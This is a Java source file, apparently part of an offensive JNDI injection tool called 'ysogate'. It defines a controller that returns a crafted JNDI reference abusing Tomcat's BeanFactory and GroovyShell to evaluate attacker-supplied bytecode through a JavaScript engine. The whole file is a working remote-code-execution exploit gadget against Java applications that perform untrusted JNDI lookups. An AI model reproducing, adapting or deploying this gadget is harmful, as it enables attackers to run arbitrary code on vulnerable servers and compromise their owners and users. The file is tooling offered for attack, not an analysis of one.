package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.controller.BasicController;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

import static com.h2tg.ysogate.bullet.defineClass.JsConverter.all;

@JNDIController
@JNDIMapping("/GroovyShell")
public class GroovyShellController extends BasicController
{
    @Override
    public Object process(Object obj)
    {
        byte[] byteCode = (byte[]) obj;
        System.out.println("[Reference] Factory: BeanFactory + GroovyShell");

        String code = all(Base64.getEncoder().encodeToString(byteCode));

        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";

        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
